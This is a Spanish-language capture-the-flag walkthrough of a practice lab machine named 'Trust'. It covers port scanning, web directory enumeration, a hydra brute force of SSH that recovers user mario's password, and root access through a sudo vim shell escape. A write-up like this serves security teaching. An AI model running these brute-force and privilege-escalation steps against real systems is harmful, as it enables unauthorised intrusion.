---
Maquina: Trust
SO: Linux
Explotación: Análisis de imágenes
Escala_privs: Permisos sudo
Dificultad: Muy fácil
tags:
  - maquina
  - fuerza_bruta
  - linux
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sV -Pn 172.17.0.2
```

![[Pasted image 20241022111335.png]]

2. **Investigación del portal web**:

Como hemos observado hay un portal web activo en el puerto 80, así que vamos a indagar en el a ver que encontramos.

Tras pasar la herramienta gobuster tenemos el siguiente resultado:

```bash 
gobuster dir -u http://172.18.0.2/ -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/common.txt
```

![[Pasted image 20241022111505.png]]

Por lo que vemos nada fuera de lo normal y la página principal es la genérica de instalación de Apache

![[Pasted image 20241022111544.png]]

Tras analizar los diferentes directorios y realizar una búsqueda por extensión de archivos si que logramos encontrar algo interesante:

```bash 
gobuster dir -u http://172.18.0.2/ -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php
```

![[Pasted image 20241022115935.png]]

![[Pasted image 20241022120005.png]]

Ya tenemos un nombre de usuario para hacer fuerza bruta al SSH.

## Explotación:

3. **Acceso al SSH por Fuerza Bruta**:

Con el usuario Mario, vamos a intentar hacer un ataque de hydra para poder acceder al SSH

```bash 
hydra -l mario -P /home/alejandro/wordlists/rockyou.txt -t 5 -vvv ssh://172.18.0.2
```

![[Pasted image 20241022120134.png]]

Listo, ya sabemos la contraseña del usuario mario -> chocolate

![[Pasted image 20241022120226.png]]

Una vez dentro ya podemos pasar a la escala de privilegios.

4. **Escala de privilegios**:

Para ver los permisos que tenemos con el comando sudo podemos ejecutar:

```bash 
sudo -l
```

![[Pasted image 20241022120323.png]]

Como podemos apreciar se puede ejecutar /usr/bin/vim como sudo.... Así que vamos a ir a la web de gtfobins para ver que comando podemos ejecutar link -> https://gtfobins.github.io/.

```bash 
sudo vim -c ':!/bin/sh'
```

![[Pasted image 20241022120426.png]]

Listo ya somos root. Si quieremos mejorar la shell podemos ejecutar:

```bash
SHELL=/bin/bash script -q /dev/null
```

![[Pasted image 20241022120528.png]]
